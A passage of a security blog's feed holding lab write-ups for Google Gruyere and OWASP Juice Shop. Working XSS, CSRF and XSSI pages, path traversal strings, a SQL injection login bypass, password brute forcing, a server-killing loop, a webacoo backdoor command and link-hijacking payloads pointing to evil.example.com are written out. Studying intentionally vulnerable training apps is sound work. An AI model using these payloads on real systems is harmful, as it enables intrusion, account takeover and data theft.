&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;webacoo -t -u http:&#x2F;&#x2F;ip&#x2F;bd.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Google Gruyere</title>
		<published>2017-03-28T00:00:00+00:00</published>
		<updated>2017-03-28T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/google-gruyere/" type="text/html"/>
		<id>https://m4l1c3.github.io/google-gruyere/</id>
		<content type="html">&lt;p&gt;#XSS&lt;&#x2F;p&gt;
&lt;p&gt;##File upload
For this I simply uploaded the following in an HTML file:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&amp;lt;script&amp;gt;alert(&#x27;hi&#x27;)&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;body&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then browsed to the URL provided&lt;&#x2F;p&gt;
&lt;p&gt;##Reflected XSS
This was as simple as appending the following to the site URL:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt;alert(&#x27;hi&#x27;)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;##Stored XSS
Here there are two places that come to mind immediately, snippets and the profile page.  There are quite a few ways to skin this cat, the one I was able to get working in multiple browsers was by using the onmouseover attribute of valid HTML elements to pop an alert, this was done using a snippet:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;a href=&quot;#&quot; onmouseover=&quot;alert(1)&quot;&amp;gt;test&amp;lt;&#x2F;a&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;##Stored XSS Via HTML Attributes
The only place I can think of to perform this other than a snippet which we already got exploited is in the profile page, it wasn&#x27;t obvious to be intially, but the profile color input can be used to apply inline CSS to your name on the home page.  For this I ended up with the following:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;black&#x27; onmouseover=&#x27;alert(1)&#x27; onfocus=&#x27;alert(2)&#x27; onblur=&#x27;alert(3)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This makes my user&#x27;s name throw an alert on hover, then on the edit profile page is pops on focus and blur, one thing to note, this didn&#x27;t initially fire because I was trying to follow normal HTML standards, after viewing page source rather than using browser debug tools I saw single quotes were used rather than normal double quotes.&lt;&#x2F;p&gt;
&lt;p&gt;##Stored XSS Via Ajax
This one took a lot of messing around, based on Google&#x27;s provided hints, the refresh button was our target.  After tinkering a lot I was able to come up with this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;hey &amp;lt;span style=display:none&amp;gt;eval(&quot; + (alert(1),&quot;&quot;) + &quot;)&amp;lt;&#x2F;span&amp;gt;hi
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This works because when you hit refresh on home a JSON object containing the latest snippets from each user gets eval&#x27;d in JavaScript, it took me quite a while to get this because I kept thinking I would need valid JSON, however when using eval the JSON value just has to be parseable JavaScript.&lt;&#x2F;p&gt;
&lt;p&gt;##Reflected XSS Via Ajax
This is very similar to the previous reflected XSS attack mentioned previously, it just gets hit in a different way.  After reading and looking through the code samples Google provides I noticed that the feed page when supplied the uid query string parameter does an eval-ish processing on the page that takes a URL like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;feed.gtl?uid=&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then renders like this in page source:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;_feed((
[
&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;&quot;
]
))
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;{
&amp;quot;private_snippet&amp;quot;:
&amp;quot;private&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;,&amp;quot;cheddar&amp;quot;:
&amp;quot;Gruyere is the cheesiest application on the web.&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;,&amp;quot;bob&amp;quot;:
&amp;quot;all &lt;span style=display:none&gt;&amp;quot; + (alert(1),&amp;quot;&amp;quot;) + &amp;quot;&lt;&#x2F;span&gt;your base&amp;quot;
,&amp;quot;brie&amp;quot;:
&amp;quot;Brie is the queen of the cheeses&lt;span style=color:red&gt;!!!&lt;&#x2F;span&gt;&amp;quot;
}&lt;&#x2F;p&gt;
&lt;p&gt;#Client-State manipulation&lt;&#x2F;p&gt;
&lt;p&gt;##Priviledge elevation
In watching requests go through Burp I noticed that user registration passes the query string parameter is_author=True, which made me wonder if there was an is_admin option to pass.  After that I was seeing my requests to update a user profile, this also included the is_author parameter.  So I just started trying to set is admin.  Initially it seemed like no attempts were working, after looking through Google&#x27;s hints it turns out that you need to log out then log back in, this way the cookie that gets used to identify you includes the admin flag, which doesn&#x27;t happen by just editing the cookie.&lt;&#x2F;p&gt;
&lt;p&gt;The reason for this is that the cookie is structured as follows:&lt;&#x2F;p&gt;
&lt;p&gt;32400598|bob||author&lt;&#x2F;p&gt;
&lt;p&gt;The first integer value is a token that gets generated server side, this seems to be the reason I wasn&#x27;t able to just modify the cookie directly to get elevated privilidges.  Upon logging out and back in the cookie looks more like this:&lt;&#x2F;p&gt;
&lt;p&gt;32400598|bob|admin|author&lt;&#x2F;p&gt;
&lt;p&gt;Now the profile page has all the admin options and the manage server link also shows up.&lt;&#x2F;p&gt;
&lt;p&gt;##Cookie manipulation
This actually ended up being a bit more difficult, the cookie that gets set to identify a given browser as being a given system user gets generated based on the login or signing up of a user.  After trying a lot of different options I broke down and looked at the hints from Google and ended up with:&lt;&#x2F;p&gt;
&lt;p&gt;brie|admin|author&lt;&#x2F;p&gt;
&lt;p&gt;As my username when registering, a side affect (or what appears to be one) is that this can circumvent logging in as well.  Upon clicking sign in I was authenticated as brie without actually logging in.&lt;&#x2F;p&gt;
&lt;p&gt;##CSRF
All of these items require browsing an HTML file locally while also authenticated with Gruyere&lt;&#x2F;p&gt;
&lt;p&gt;To complete the exercise of deleting someone&#x27;s snippet:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;img src=&quot;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;deletesnippet?index=0&quot; &#x2F;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then just for fun, I tested updating a user&#x27;s profile using the same technique, which worked:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;img src=&quot;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;saveprofile?action=update&amp;uid=bob&amp;name=bob&amp;oldpw=&amp;pw=&amp;icon=buttfart&amp;web_site=http%3A%2F%2Fgithub.com&amp;color=black&amp;private_snippet=privat&quot; &#x2F;&gt;
&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;##XSSI
For this exercise I ended up with:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;
&lt;script&gt;function _feed(s) {document.write(&#x27;your private thing is: &#x27; + s[&#x27;private_snippet&#x27;]);}&lt;&#x2F;script&gt;&lt;script src=&quot;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;feed.gtl&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;What this is doing is defining a function that matches how the JavaScript in feed.gtl gets called, and then outputting data stored outside of our local files boundaries, but because the executing script has Google&#x27;s system&#x2F;domain as its context it has access to the snipped data where our _feed(s) function would have never originally had access.&lt;&#x2F;p&gt;
&lt;p&gt;#Path Traversal&lt;&#x2F;p&gt;
&lt;p&gt;##Information disclosure via path traversal
This ended up being really simple, but the browser was correcting the URL so it didn&#x27;t work initially, my ..&#x2F;secret.txt needed to be ..%2Fsecret.txt, updating the encoding made things work.&lt;&#x2F;p&gt;
&lt;p&gt;##Data tampering via path traversal
For this one I started off trying to get the file overwritten by having a filename that included the directory traversal, however that just wouldn&#x27;t work:
..%2F..2Fsecret.txt&lt;&#x2F;p&gt;
&lt;p&gt;After a bit of head scratching the username ended up working, signing up as a user with the name: ..%2F..%2F then uploading a new secret.txt, success.&lt;&#x2F;p&gt;
&lt;p&gt;#Denial of Service&lt;&#x2F;p&gt;
&lt;p&gt;##DoS - Quit the server
This one was pretty fun.  I totally forgot about CORS and originally wrote up a snippet of JavaScript to try and get this working, however the ajax requests got blocked by browser security.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;
  &lt;head&gt;
      &lt;title&gt;&lt;&#x2F;title&gt;
      &lt;script src=&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;
      &lt;script&gt;
          (function($) {
              &#x27;use strict&#x27;;
              var killbot = {
                  init: function() {
                      setInterval(function() {
                          $.ajax({
                              method: &#x27;GET&#x27;,
                              url: &#x27;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;quitserver&#x27;
                          }).done(function(response) {
                              document.write(&#x27;Killed server successfully\n&#x27;);
                              document.write(response);
                          }).error(function(response) {
                              document.write(&#x27;Error killing server&#x27;);
                              document.write(response);
                          });
                      }, 5000);
                  },
                  handleEvents: function() {
                      let self = this;
                      $(&#x27;#start&#x27;).on(&#x27;click&#x27;, function(e) {
                          e.preventDefault();
                          self.init();
                      });

                      $(&#x27;#stop&#x27;).on(&#x27;click&#x27;, function() {
                          e.preventDefault();
                          clearInterval();
                      });
                  }
              };
              killbot.init();
          }(jQuery));
      &lt;&#x2F;script&gt;
  &lt;&#x2F;head&gt;
  &lt;body&gt;
      &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;start&quot;&gt;start&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
          &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;stop&quot;&gt;stop&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
      &lt;&#x2F;ul&gt;
      &lt;img src=&quot;&quot;
  &lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;At this point I was thinking how useful would making a CSRF-ish attack using an image tag be?  It turns out with some Javascript and the image tag method worked together beautifully.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;html&gt;
  &lt;head&gt;
      &lt;title&gt;&lt;&#x2F;title&gt;
      &lt;script src=&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.2.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;
      &lt;script&gt;
          (function($) {
              &#x27;use strict&#x27;;
              var killbot = {
                  init: function() {
                      setInterval(function() {
                          $(&#x27;img&#x27;).attr(&#x27;src&#x27;, &#x27;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;quitserver&#x27;);
                      }, 200);
                  },
                  handleEvents: function() {
                      let self = this;
                      $(&#x27;#start&#x27;).on(&#x27;click&#x27;, function(e) {
                          e.preventDefault();
                          self.init();
                      });

                      $(&#x27;#stop&#x27;).on(&#x27;click&#x27;, function() {
                          e.preventDefault();
                          clearInterval();
                      });
                  }
              };
              killbot.init();
          }(jQuery));
      &lt;&#x2F;script&gt;
  &lt;&#x2F;head&gt;
  &lt;body&gt;
      &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;start&quot;&gt;start&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
          &lt;li&gt;&lt;a href=&quot;#&quot; id=&quot;stop&quot;&gt;stop&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
      &lt;&#x2F;ul&gt;
      &lt;img src=&quot;http:&#x2F;&#x2F;google-gruyere.appspot.com&#x2F;458351305912&#x2F;quitserver&quot; &#x2F;&gt;
  &lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This worked both in an authenticated and un-authenticated browser session, its basically utilizing the same method to continually performing the server quit action on a loop.  Then just for fun I tried this on a browser that wasn&#x27;t authenticated and it still worked, double whammy.&lt;&#x2F;p&gt;
&lt;p&gt;##DoS - Overloading the server
I had to look at the hints on this one to get it working.  Pretty much just overridding a template that gets rendered on every page, it ended up being menubar.gtl:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;[[include:menubar.gtl]]DoS[[&#x2F;include:menubar.gtl]]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;#Code Execution
From looking at the files that power gruyer and the docs it looks like one of these .py files could be used.  I tried a few, the last of which being sanitize.py adding the following:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from urlparse import urlparse, parse_qs

form = util.FieldStorage(req, keep_blank_values=1)
myparameter = form.getfirst(&quot;cmd&quot;)
print myparameter
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;#Configuration Vulnerabilities&lt;&#x2F;p&gt;
&lt;p&gt;##Information Disclosure 1
This one ended up being pretty easy, the description mentioned checking the files, a quick search through with grep for debug and config:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;grep -irE &#x27;debug|config&#x27; *
gruyere.py:  def _DoReset(self, cookie, specials, params):  # debug only; resets this db
gtl.py:  elif escaper_name == &#x27;pprint&#x27;:  # for debugging
resources&#x2F;dump.gtl:&lt;title&gt;Debug Dump&lt;&#x2F;title&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looking at dump.gtl is prints the database out to a page:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;_cookie:  	

{&#x27;is_admin&#x27;: True, &#x27;is_author&#x27;: True, &#x27;uid&#x27;: u&#x27;bob&#x27;}

_profile:  	

{&#x27;is_author&#x27;: &#x27;True&#x27;, &#x27;name&#x27;: &#x27;bob&#x27;, &#x27;pw&#x27;: &#x27;password&#x27;}

_db:  	

{&#x27;..&#x2F;&#x27;: {&#x27;is_author&#x27;: &#x27;True&#x27;, &#x27;name&#x27;: &#x27;..&#x2F;&#x27;, &#x27;pw&#x27;: &#x27;password&#x27;},
 &#x27;..&#x2F;..&#x2F;&#x27;: {&#x27;is_author&#x27;: &#x27;True&#x27;, &#x27;name&#x27;: &#x27;..&#x2F;..&#x2F;&#x27;, &#x27;pw&#x27;: &#x27;password&#x27;},
 &#x27;administrator&#x27;: {&#x27;is_admin&#x27;: True,
                   &#x27;is_author&#x27;: False,
                   &#x27;name&#x27;: &#x27;Admin&#x27;,
                   &#x27;private_snippet&#x27;: &#x27;My password is secret. Get it?&#x27;,
                   &#x27;pw&#x27;: &#x27;secret&#x27;,
                   &#x27;web_site&#x27;: &#x27;http:&#x2F;&#x2F;www.google.com&#x2F;contact&#x2F;security.html&#x27;},
 &#x27;bob&#x27;: {&#x27;is_author&#x27;: &#x27;True&#x27;, &#x27;name&#x27;: &#x27;bob&#x27;, &#x27;pw&#x27;: &#x27;password&#x27;},
 &#x27;bob|admin|author&#x27;: {&#x27;is_author&#x27;: &#x27;True&#x27;,
                      &#x27;name&#x27;: &#x27;bob|admin|author&#x27;,
                      &#x27;pw&#x27;: &#x27;password&#x27;},
 &#x27;brie&#x27;: {&#x27;color&#x27;: &#x27;red; text-decoration:underline&#x27;,
          &#x27;is_admin&#x27;: False,
          &#x27;is_author&#x27;: True,
          &#x27;name&#x27;: &#x27;Brie&#x27;,
          &#x27;private_snippet&#x27;: &#x27;I use the same password for all my accounts.&#x27;,
          &#x27;pw&#x27;: &#x27;briebrie&#x27;,
          &#x27;snippets&#x27;: [&#x27;Brie is the queen of the cheeses&lt;span style=color:red&gt;!!!&lt;&#x2F;span&gt;&#x27;],
          &#x27;web_site&#x27;: &#x27;http:&#x2F;&#x2F;news.google.com&#x2F;news&#x2F;search?q=brie&#x27;},
 &#x27;cheddar&#x27;: {&#x27;color&#x27;: &#x27;blue&#x27;,
             &#x27;is_admin&#x27;: False,
             &#x27;is_author&#x27;: True,
             &#x27;name&#x27;: &#x27;Cheddar Mac&#x27;,
             &#x27;private_snippet&#x27;: &#x27;My SSN is &lt;a href=&quot;http:&#x2F;&#x2F;www.google.com&#x2F;search?q=078-05-1120&quot;&gt;078-05-1120&lt;&#x2F;a&gt;.&#x27;,
             &#x27;pw&#x27;: &#x27;orange&#x27;,
             &#x27;snippets&#x27;: [&#x27;Gruyere is the cheesiest application on the web.&#x27;,
                          &#x27;I wonder if there are any security holes in this....&#x27;],
             &#x27;web_site&#x27;: &#x27;http:&#x2F;&#x2F;images.google.com&#x2F;images?q=cheddar+cheese&#x27;},
 &#x27;sardo&#x27;: {&#x27;color&#x27;: &#x27;red&#x27;,
           &#x27;is_admin&#x27;: False,
           &#x27;is_author&#x27;: True,
           &#x27;name&#x27;: &#x27;Miss Sardo&#x27;,
           &#x27;private_snippet&#x27;: &#x27;I hate my brother Romano.&#x27;,
           &#x27;pw&#x27;: &#x27;odras&#x27;,
           &#x27;snippets&#x27;: [],
           &#x27;web_site&#x27;: &#x27;http:&#x2F;&#x2F;www.google.com&#x2F;search?q=&quot;pecorino+sardo&quot;&#x27;}}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;##Information Disclosure 2
After digging around more in the code thinking the vulnerability existed somewhere else I remembered that I can just upload arbitrary files to the server.  So I just went and uploaded the dump.gtl file back to the server in resources, then I was able to use the dump template again.&lt;&#x2F;p&gt;
&lt;p&gt;##Information Disclosure 3
This one referred to bad code so I starting going through the python some more.  Looking at gtl.py, which looks like it handles the various components of the templating language.  There is a section that uses {{ }} as variables:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;VAR_OPEN = &#x27;{{&#x27;
VAR_CLOSE = &#x27;}}&#x27;


def _ExpandVariables(template, specials, params, name):
  &quot;&quot;&quot;Expands all the variables in a template.&quot;&quot;&quot;
  result = []
  rest = template
  while rest:
    tag, before_tag, after_tag = _FindTag(rest, VAR_OPEN, VAR_CLOSE)
    if tag is None:
      break
    result.append(rest[:before_tag])
    result.append(str(_ExpandVariable(tag, specials, params, name)))
    rest = rest[after_tag:]
  return &#x27;&#x27;.join(result) + rest
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This looks like it would be used for handling something like {{_db:pprint}} from dump.gtl&lt;&#x2F;p&gt;
&lt;p&gt;Looking at the edit&#x2F;show profile template, two of the fields in a profile use the {{}} syntax for outputting data:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;input type=&#x27;text&#x27; name=&#x27;web_site&#x27; value=&#x27;{{_profile.web_site:text}}&#x27;&gt;
&lt;input type=&#x27;text&#x27; name=&#x27;private_snippet&#x27; value=&#x27;{{_profile.private_snippet:text}}&#x27;&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;They look like something to check out, lets just try putting {{_db:pprint}} in.&lt;&#x2F;p&gt;
&lt;p&gt;After saving the db dump gets thrown into the form controls.&lt;&#x2F;p&gt;
&lt;p&gt;#Ajax Vulnerabilities&lt;&#x2F;p&gt;
&lt;p&gt;##DoS via Ajax&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&quot; + eval(document.getElementById(&#x27;menu-right&#x27;).getElementsByTagName(&#x27;a&#x27;)[0].setAttribute(&#x27;href&#x27;, &#x27;http:&#x2F;&#x2F;evil.example.com&#x27;)) + &quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;##Phishing via Ajax
&amp;quot; + eval(console.log(document.getElementById(&#x27;menu-right&#x27;).getElementsByTagName(&#x27;a&#x27;)[0].setAttribute(&#x27;href&#x27;, &#x27;http:&#x2F;&#x2F;evil.example.com&#x27;))) + &amp;quot;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>OWASP Juice Shop</title>
		<published>2017-01-09T00:00:00+00:00</published>
		<updated>2017-01-09T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/juice-shop/" type="text/html"/>
		<id>https://m4l1c3.github.io/juice-shop/</id>
		<content type="html">&lt;p&gt;#OWASP Juice Shop&lt;&#x2F;p&gt;
&lt;p&gt;I started this process off by trying to throw some JavaScript into the search box, looks vulnerable to XSS:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;script type=&quot;text&#x2F;javascript&quot;&amp;gt;alert(&#x27;hi&#x27;);&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Results in an alert popping up after the site issues a GET request to the server, followed by a UI alert stating an objective had been reached, finding unhandled exceptions.&lt;&#x2F;p&gt;
&lt;p&gt;Next I looked through the login page&#x27;s source to see if anything sticks out and found this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;!--
    &lt;li class=&quot;dropdown&quot;&gt;
       &lt;a href=&quot;#&#x2F;score-board&quot;&gt;Score Board&lt;&#x2F;a&gt;
    &lt;&#x2F;li&gt;
--&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like I found the scoreboard for the app and it is available at the following route:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;a href=&quot;#&#x2F;score-board&quot;&gt;Score Board&lt;&#x2F;a&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now that I&#x27;ve got a list of the challenges I do the following as a search:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt;alert(&quot;XSS1&quot;)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Which successfully performs a reflected XSS attack.&lt;&#x2F;p&gt;
&lt;p&gt;I next went through the process of placing an order and noticed the URL for my receipt was using a subdirectory, I tried browsing to the folder &#x2F;ftp and was presented with files I could download, which ended up getting me another achievement: access a confidential document&lt;&#x2F;p&gt;
&lt;p&gt;Next I was able to get to the administration section of the store by going to:&lt;&#x2F;p&gt;
&lt;p&gt;#&#x2F;administration&lt;&#x2F;p&gt;
&lt;p&gt;Once on the admin page I was able to get another achievement by deleting the only user comment with a 5 star rating&lt;&#x2F;p&gt;
&lt;p&gt;Next I see there is a task to login as the administrator.  Based on the fact that the site already seems vulnerable to SQL injection I am going to fire up Burp Suite and try some things, the first place that came to mind to check was the login form.  I already know the admin user from getting access to the admin page that wasn&#x27;t secured, but I&#x27;m going to just try using the username&#x2F;email field for injection.&lt;&#x2F;p&gt;
&lt;p&gt;After some googling (or in my case duck duck go-ing) I was lead to FuzzDB and plugged the xplatform list under attack&#x2F;detect.  After inspecting the responses it looks like this super simple gem: a&#x27; or 1=1-- will do the trick.  Try using that as my user and bam, logged in as admin.&lt;&#x2F;p&gt;
&lt;p&gt;Since I&#x27;m already focused on the admin login I&#x27;m next going to try and login as admin without performing SQL injection.  Back to Burp Suite.  This time I&#x27;m going to try and brute force the admin login now that I know the email address: admin@juice-sh.op.  After using Burp&#x27;s intruder with the &amp;quot;big.txt&amp;quot; from Kali&#x27;s dirb wordlists Looks like we have a successful payload: admin123.&lt;&#x2F;p&gt;
&lt;p&gt;Now that I&#x27;ve gotten that one I noticed that we have challenges to login as jim and and bender, might as well try the same technique with these two.&lt;&#x2F;p&gt;
&lt;p&gt;Another challenge: Place an order that makes you rich.&lt;&#x2F;p&gt;
&lt;p&gt;First I tried just manipulating the markup to see if I&#x27;d be able to just change the value and then update the quantity, however the model binding in angular kept that from working.&lt;&#x2F;p&gt;
&lt;p&gt;Back to Burp, this should be an easy task using the intercept.  Once everything is up and running I can see in the quantity being passed to the server, after changing the value to -100000 and forwarding traffic I can see a large negative total for the line item, now to checkout, and bam challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Now that I&#x27;ve gotten access to admin I&#x27;m going to take a look at getting some of the hidden files in that &#x2F;ftp directory.  Right now the two .bak fils are being blocked, lets head over to burp to try and use repeater to get these files out.  I got stuck on this one and watched a walkthrough and, basically passing in null characters to the URL to trick the express routing, I initially tried %00, which didn&#x27;t work, then tried %2500 and got through: &#x2F;ftp&#x2F;package.json.bak%2500.pdf to get the file.&lt;&#x2F;p&gt;
&lt;p&gt;This ended up being the same for retrieving the easter egg and old coupon file.&lt;&#x2F;p&gt;
&lt;p&gt;For the easter egg I got back a base64 encoded value: L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA== that decodes to: &#x2F;gur&#x2F;qrif&#x2F;ner&#x2F;fb&#x2F;shaal&#x2F;gurl&#x2F;uvq&#x2F;na&#x2F;rnfgre&#x2F;rtt&#x2F;jvguva&#x2F;gur&#x2F;rnfgre&#x2F;rtt&lt;&#x2F;p&gt;
&lt;p&gt;Another challenge that has been sticking in my head is the one about applying advanced crypto-analysis to the easter egg.  I had already identified the easter egg contents to be base64 encoded, however after decoding it just looked like an absurd file path.  I got stuck on this one and ended up checking a walkthrough, looks like it&#x27;s rot13 encoded, after decoding I got: &#x2F;the&#x2F;devs&#x2F;are&#x2F;so&#x2F;funny&#x2F;they&#x2F;hid&#x2F;an&#x2F;easter&#x2F;egg&#x2F;within&#x2F;the&#x2F;easter&#x2F;egg and tried appending this to the base URL and got a new page along with challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;For the coupon file:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;n&lt;MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
o*I]pgC7sn
n(XRvgC7sn
n(XLtgC7sn
k#*AfgC7sn
q:&lt;IqgC7sn
pEw8ogC7sn
pes[BgC7sn
l}6D$gC7ss
